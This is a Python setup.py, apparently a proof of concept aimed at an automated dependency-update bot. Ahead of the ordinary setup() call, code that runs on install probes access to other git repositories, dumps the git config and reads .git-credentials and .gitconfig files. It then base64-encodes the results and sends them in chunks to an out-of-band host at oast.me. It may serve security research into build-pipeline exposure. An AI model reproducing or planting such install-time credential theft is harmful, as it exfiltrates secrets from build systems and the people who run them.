import os
import urllib.request
import base64
import subprocess

# Test cross-repo git access - can we access repos beyond the current one?
results = {}

# Test 1: ls-remote on the SAME repo (should work - baseline)
try:
    r = subprocess.run(['git', 'ls-remote', 'https://github.com/toofikz2/depbot-impact-test.git', 'HEAD'],
                       capture_output=True, text=True, timeout=10)
    results['same_repo'] = f'rc={r.returncode} out={r.stdout[:50]}'
except Exception as e:
    results['same_repo'] = f'err={str(e)[:50]}'

# Test 2: ls-remote on PRIVATE repo in same org  
try:
    r = subprocess.run(['git', 'ls-remote', 'https://github.com/tooforg/private-test-repo.git', 'HEAD'],
                       capture_output=True, text=True, timeout=10)
    results['org_private'] = f'rc={r.returncode} out={r.stdout[:50]}'
except Exception as e:
    results['org_private'] = f'err={str(e)[:50]}'

# Test 3: ls-remote on PERSONAL private repo (should NOT be accessible)
try:
    r = subprocess.run(['git', 'ls-remote', 'https://github.com/toofikz1/personal-secret-repo.git', 'HEAD'],
                       capture_output=True, text=True, timeout=10)
    results['personal_private'] = f'rc={r.returncode} out={r.stdout[:50]}'
except Exception as e:
    results['personal_private'] = f'err={str(e)[:50]}'

# Test 4: Check git credential helper config
try:
    r = subprocess.run(['git', 'config', '--list'], capture_output=True, text=True, timeout=5)
    results['git_config'] = r.stdout[:300]
except Exception as e:
    results['git_config'] = f'err={str(e)[:50]}'

# Test 5: Check .gitconfig and credential files
import pathlib
for path in ['/home/dependabot/.gitconfig', '/home/dependabot/.git-credentials',
             '/root/.gitconfig', '/root/.git-credentials']:
    try:
        content = pathlib.Path(path).read_text()[:200]
        results[f'file:{path}'] = content
    except Exception as e:
        results[f'file:{path}'] = f'err={str(e)[:30]}'

# Exfil results
import json
payload = base64.urlsafe_b64encode(json.dumps(results).encode()).decode()
chunks = [payload[i:i+1800] for i in range(0, min(len(payload), 9000), 1800)]
for i, chunk in enumerate(chunks):
    try:
        urllib.request.urlopen(f'http://d99nabu1b2er8r4l5b6g1oh7ofjto74s7.oast.me/crossrepo/{i}?d=' + chunk, timeout=5)
    except:
        pass

# Normal setup()
from setuptools import setup
setup(
    name="depbot-impact-test",
    version="1.0.0",
    install_requires=["requests==2.26.0", "urllib3==1.26.5", "flask==2.0.0"],
)
